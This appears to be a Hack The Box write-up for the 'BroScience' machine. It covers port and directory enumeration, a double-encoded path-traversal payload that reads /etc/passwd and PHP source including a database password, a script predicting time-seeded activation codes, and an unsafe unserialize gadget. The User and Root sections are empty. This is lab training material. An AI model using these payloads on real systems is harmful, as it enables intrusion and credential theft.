---
title: "[HTB] Machine: BroScience"
description: "[HTB] Machine: BroScience"
date: 2023-11-13
menu:
  sidebar:
    name: "[HTB] Machine: BroScience"
    identifier: htb-machine-BroScience
    parent: htb-machines-linux
    weight: 10
hero: images/broscience.png
tags: ["HTB"]
---

# BroScience
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.195 --min-rate 1000                                                                                                        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 20:07 GMT
Warning: 10.10.11.195 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.195 (10.10.11.195)
Host is up (0.17s latency).
Not shown: 65488 closed tcp ports (conn-refused), 44 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 79.36 seconds

```
```
└─$ nmap -Pn -p22,80,443 -sC -sV 10.10.11.195 --min-rate 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-12 20:09 GMT
Nmap scan report for 10.10.11.195 (10.10.11.195)
Host is up (0.23s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.41 seconds

```

- Web Server

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u https://broscience.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 50 -k --depth 2

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://broscience.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      321c https://broscience.htb/includes => https://broscience.htb/includes/
301      GET        9l       28w      319c https://broscience.htb/images => https://broscience.htb/images/
200      GET        3l        7w       44c https://broscience.htb/styles/light.css
200      GET       29l       70w     1309c https://broscience.htb/user.php
200      GET       28l       71w     1322c https://broscience.htb/exercise.php
200      GET        1l        4w       39c https://broscience.htb/includes/img.php
200      GET       42l       97w     1936c https://broscience.htb/login.php
200      GET      147l      510w     9295c https://broscience.htb/
200      GET        0l        0w        0c https://broscience.htb/includes/utils.php
200      GET      220l     1542w   123552c https://broscience.htb/images/reverse_butterfly.jpeg
200      GET      122l      678w    56054c https://broscience.htb/images/bench.png
500      GET        2l        4w       65c https://broscience.htb/includes/navbar.php
200      GET        5l       14w      369c https://broscience.htb/includes/header.php
200      GET        0l        0w        0c https://broscience.htb/includes/db_connect.php
301      GET        9l       28w      319c https://broscience.htb/styles => https://broscience.htb/styles/
200      GET        3l        7w       41c https://broscience.htb/styles/dark.css
200      GET      161l     1002w    83700c https://broscience.htb/images/seated_rows.png
301      GET        9l       28w      323c https://broscience.htb/javascript => https://broscience.htb/javascript/
200      GET      383l     2045w   205698c https://broscience.htb/images/barbell_squats.jpeg
200      GET        0l        0w   598012c https://broscience.htb/images/shoulder_press.jpeg
200      GET        0l        0w  1011236c https://broscience.htb/images/deadlift.png
200      GET        0l        0w   326860c https://broscience.htb/images/dumbell_curls.jpeg
200      GET        0l        0w   297898c https://broscience.htb/images/tricep_extensions.jpeg
301      GET        9l       28w      319c https://broscience.htb/manual => https://broscience.htb/manual/
301      GET        9l       28w      326c https://broscience.htb/manual/images => https://broscience.htb/manual/images/
301      GET        9l       28w      322c https://broscience.htb/manual/en => https://broscience.htb/manual/en/
301      GET        9l       28w      325c https://broscience.htb/manual/style => https://broscience.htb/manual/style/
301      GET        9l       28w      322c https://broscience.htb/manual/de => https://broscience.htb/manual/de/
301      GET        9l       28w      322c https://broscience.htb/manual/fr => https://broscience.htb/manual/fr/
301      GET        9l       28w      322c https://broscience.htb/manual/es => https://broscience.htb/manual/es/
301      GET        9l       28w      322c https://broscience.htb/manual/ru => https://broscience.htb/manual/ru/
200      GET      129l      566w    10124c https://broscience.htb/manual/ja/index.html
200      GET      127l      643w    10996c https://broscience.htb/manual/ru/index.html
200      GET      118l      578w     9683c https://broscience.htb/manual/ko/index.html
200      GET      130l      623w     9843c https://broscience.htb/manual/de/index.html
200      GET      127l      637w     9903c https://broscience.htb/manual/tr/index.html
200      GET      129l      701w    10325c https://broscience.htb/manual/es/index.html
200      GET      123l      648w     9828c https://broscience.htb/manual/pt-br/index.html
200      GET      130l      683w    10033c https://broscience.htb/manual/fr/index.html
200      GET      127l      636w     9666c https://broscience.htb/manual/en/index.html
200      GET      121l      605w     9416c https://broscience.htb/manual/da/index.html
200      GET      124l      553w     9400c https://broscience.htb/manual/zh-cn/index.html
200      GET       14l       28w      676c https://broscience.htb/manual/
301      GET        9l       28w      322c https://broscience.htb/manual/ja => https://broscience.htb/manual/ja/
301      GET        9l       28w      322c https://broscience.htb/manual/tr => https://broscience.htb/manual/tr/
301      GET        9l       28w      322c https://broscience.htb/manual/da => https://broscience.htb/manual/da/
301      GET        9l       28w      322c https://broscience.htb/manual/ko => https://broscience.htb/manual/ko/
301      GET        9l       28w      325c https://broscience.htb/manual/zh-cn => https://broscience.htb/manual/zh-cn/
[####################] - 71s   168946/168946  0s      found:48      errors:151508 
[####################] - 61s    56294/56294   919/s   https://broscience.htb/ 
[####################] - 2s     56294/56294   35765/s https://broscience.htb/includes/ => Directory listing
[####################] - 8s     56294/56294   7381/s  https://broscience.htb/images/ => Directory listing
[####################] - 1s     56294/56294   68235/s https://broscience.htb/styles/ => Directory listing
[####################] - 56s    56294/56294   1011/s  https://broscience.htb/javascript/ 
[####################] - 51s    56294/56294   1107/s  https://broscience.htb/manual/   
```
```
└─$ gobuster dir -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php -t 50 --no-error -k

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 2161]
/.php                 (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 9295]
/.html.php            (Status: 403) [Size: 280]
/login.php            (Status: 200) [Size: 1936]
/user.php             (Status: 200) [Size: 1309]
/.htm.php             (Status: 403) [Size: 280]
/.htm                 (Status: 403) [Size: 280]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/.                    (Status: 200) [Size: 9295]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/.htaccess.php        (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/activate.php         (Status: 200) [Size: 1256]
/.phtml               (Status: 403) [Size: 280]
```
- Nothing on `vhosts`

## Foothold
- `https://broscience.htb/includes/img.php?path=<FILE>` looks interesting
  - If we enter `/etc/passwd` it returns `attack detected`

![](./images/2.png)

- Let's fuzz with `LFI` [wordlist](https://github.com/foospidy/payloads/blob/master/other/traversal/dotdotpwn.txt)
```
└─$ wfuzz -u 'https://broscience.htb/includes/img.php?path=FUZZ' -w ./dotdotpwn.txt --hh 30,0                 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://broscience.htb/includes/img.php?path=FUZZ
Total requests: 21144

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000165:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
000000166:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fissue"
000000162:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252f..%252fetc%252fissue"
000000161:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
000000158:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252fetc%252fissue"
000000157:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252fetc%252fpasswd"
```

- We have `lfi`
```
└─$ curl -k https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

- Let's try reading source code
```
└─$ curl -k https://broscience.htb/includes/img.php?path=..%252findex.php                                        
<?php
session_start();
?>

<html>
    <head>
        <title>BroScience : Home</title>
        <?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?>
        <link rel="stylesheet" href="styles/<?=$theme?>.css">
    </head>
    <body class="<?=get_theme_class($theme)?>">
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-margin">
            <!-- TODO: Search bar -->
            <?php
            include_once 'includes/db_connect.php';
<SNIP>
```
```
└─$ curl -k https://broscience.htb/includes/img.php?path=..%252fincludes%252fdb_connect.php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>      
```

- `utils.php` looks interesting, since it has `unserialize` part
```
└─$ curl -k https://broscience.htb/includes/img.php?path=..%252fincludes%252futils.php     
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
                $this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

<SNIP>    

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>                                 
```
- We could potentially exploit `$up = unserialize(base64_decode($up_cookie));` 
  - But for that cookie we need a session
  - We also have `__wakeup()` in `AvatarInterface` class
    - It's a [magic method](https://www.php.net/manual/en/language.oop5.magic.php)
    - `Conversely, unserialize() checks for the presence of a function with the magic name __wakeup(). If present, this function can reconstruct any resources that the object may have. `
  - So if we can make backend unserialize `AvatarInterface`, it will run `__wakeup`, which will run the `save` function
  - But we need a session, for that we need to register
    - `utils.php` has `generate_activation_code` function which generates activation code and sends for confirmation
  - Let's create a user and intercept the request in `Burp`
    - We need a time of the request since `generate_activation_code` uses it as seed for `srand` function

![](./images/3.png)

![](./images/4.png)

![](./images/5.png)

- We will modify the code to generate a list of possible codes

```
<?php
function generate_activation_code($t) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($t);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$time = strtotime("Mon, 13 Nov 2023 17:23:37 GMT");
for ($t = $time - 30; $t <= $time + 30; $t++) {
    echo generate_activation_code($t) . "\n";
}

?>
```
```
└─$ php generate_activation_code.php 
3duOCMkMOk9046OpNNfupjyxG4CjqhZM
itjeMWZooHwDKHrLtWckPHMldxIxVZOM
zQqG2gR48h8xkQlpOB6uwr2TBGTgiC9p
qBV5YfxaIDa2A6Fq8HyaxNhbJEmVipQa
UsqBNbewBGbu7oT0UKaAixvFu0F5iZyw
WM2JPSNqPxz3QtriuXxmqYfpGKqYgDRU
mS2I8RKBaNOzXVTqBuHriuwyY8fC9kYZ
1jzgUHbjlui0X8MKwmj78FVxAd28NeuQ
lewE4eIK8FRoc4TF3g1ZrsEUywBoAGX0
4iCUOrzJVI3wcmv8Fp8Jy8pRRJpR0NSG
jsBgzPkf0LgvqBKem8HgZ1PiPE7nDzoX
k7rbDj8ROdigIkJ9zreirqYtKHkdtTGZ
M5R9gKA4p7uj4AgblR2fRlEmTJ4qtY7y
QLKg7Tj6Y8NEEf2pH0ujhDCQzbUdvkCc
ECEzN4LLJ076UDG3wMtktEOC41TNDV5X
VYwEswdIB54hkogCgzcCOdD3tMbhJTWD
FhZhwk8PrGEqiUT4y0gaKGuNKPwkb0Iq
f26LHeIDtIjFaYhxde8mLYQPbdVvIQ98
ZEfnBtJf6S0sfgwfmixYsWXajih4LC6o
YJ1R5Z4L1w0kaKmBdnHsOxItbaZGyMfS
bU1srndgFiZkXTFlNNo7mvwirvWub3eh
<SNIP>
```

- The endpoint we have to visit is `activate.php?code=<CODE>`
```
└─$ curl -k https://broscience.htb/includes/img.php?path=..%252factivate.php               
<?php
session_start();

// Check if user is logged in already
if (isset($_SESSION['id'])) {
    header('Location: /index.php');
}

if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
        include_once 'includes/db_connect.php';
<SNIP>
```

![](./images/6.png)

![](./images/8.png)

- Now, we have our session
```
└─$ echo 'Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=' | base64 -d
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";} 
```
## User

## Root
